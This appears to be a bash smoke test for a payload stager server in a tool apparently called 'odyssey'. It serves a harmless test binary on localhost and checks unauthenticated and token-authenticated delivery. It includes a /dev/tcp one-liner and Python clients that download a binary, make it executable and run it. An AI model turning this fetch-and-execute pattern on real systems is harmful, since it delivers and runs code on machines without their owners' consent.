#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
ODYSSEY="${ODYSSEY:-$ROOT_DIR/bin/odyssey}"
PIDS=()

track_pid() { PIDS+=("$1"); }
cleanup() {
    local p
    for p in "${PIDS[@]}"; do kill "$p" 2>/dev/null || true; done
}
trap cleanup EXIT

# test payload
gcc -Os -static -s -x c -o /tmp/test_stager_payload - << 'CEOF'
#include <stdio.h>
int main(int c, char **v) {
    printf("STAGER_OK");
    for (int i = 1; i < c; i++) printf(" %s", v[i]);
    printf("\n");
    return 0;
}
CEOF

echo "[S1] test 1/3: no-auth raw serve"

"$ODYSSEY" stager-server --listen 127.0.0.1:19100 \
    --binary /tmp/test_stager_payload --no-auth --single-use --verbose &
track_pid "$!"
sleep 0.5

REPLY=$(bash -c 'exec 3<>/dev/tcp/127.0.0.1/19100; cat <&3 > /tmp/.st1; chmod +x /tmp/.st1; /tmp/.st1 --from-raw')
if [ "$REPLY" != "STAGER_OK --from-raw" ]; then
    echo "FAIL: expected 'STAGER_OK --from-raw', got '$REPLY'" >&2
    exit 1
fi
rm -f /tmp/.st1
echo "[S1] ok 1/3"

echo "[S1] test 2/3: token auth serve"

"$ODYSSEY" stager-server --listen 127.0.0.1:19101 \
    --binary /tmp/test_stager_payload --token "test-token-1234567890!!" \
    --args "--from-auth test" --single-use --verbose &
track_pid "$!"
sleep 0.5

REPLY=$(python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('127.0.0.1', 19101))
token = b'test-token-1234567890!!'
s.sendall(struct.pack('!II', 0x4F445353, len(token)) + token)
status = s.recv(1)
assert status == b'\x01', f'auth failed: {status}'
bin_len = struct.unpack('!I', s.recv(4))[0]
data = b''
while len(data) < bin_len:
    data += s.recv(bin_len - len(data))
args_len = struct.unpack('!I', s.recv(4))[0]
args = b''
while len(args) < args_len:
    args += s.recv(args_len - len(args))
s.close()
with open('/tmp/.st2', 'wb') as f:
    f.write(data)
import os, subprocess
os.chmod('/tmp/.st2', 0o700)
argv = ['/tmp/.st2'] + [a for a in args.decode().split('\x00') if a]
r = subprocess.run(argv, capture_output=True, text=True)
print(r.stdout.strip())
")

if [ "$REPLY" != "STAGER_OK --from-auth test" ]; then
    echo "FAIL: expected 'STAGER_OK --from-auth test', got '$REPLY'" >&2
    exit 1
fi
rm -f /tmp/.st2
echo "[S1] ok 2/3"

echo "[S1] test 3/3: bad token rejection"

"$ODYSSEY" stager-server --listen 127.0.0.1:19102 \
    --binary /tmp/test_stager_payload --token "correct-token-12345678" \
    --single-use --verbose &
track_pid "$!"
sleep 0.5

RESULT=$(python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect(('127.0.0.1', 19102))
token = b'WRONG-token-123456789!'
s.sendall(struct.pack('!II', 0x4F445353, len(token)) + token)
status = s.recv(1)
if status == b'\x00':
    print('REJECTED')
else:
    print('FAIL')
s.close()
")

if [ "$RESULT" != "REJECTED" ]; then
    echo "FAIL: expected 'REJECTED', got '$RESULT'" >&2
    exit 1
fi
echo "[S1] ok 3/3"

rm -f /tmp/test_stager_payload
echo "S1_SMOKE_OK"
